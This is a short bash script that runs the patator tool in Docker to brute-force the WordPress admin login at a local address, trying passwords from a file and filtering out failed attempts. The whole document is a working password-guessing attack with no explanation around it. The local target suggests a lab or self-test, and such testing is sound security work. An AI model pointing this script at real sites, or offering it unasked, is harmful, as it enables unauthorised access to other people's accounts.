#!/usr/bin/env bash

pass='/tmp/pass.txt'
url='http://127.0.0.1:9999/wp-login.php'
user='admin'

docker run --rm -it -v $pass:/F0 \
patator http_fuzz url=$url method=POST \
body="log=$user&pwd=FILE0" 0=/F0 \
-x ignore:fgrep='is incorrect' -t 5
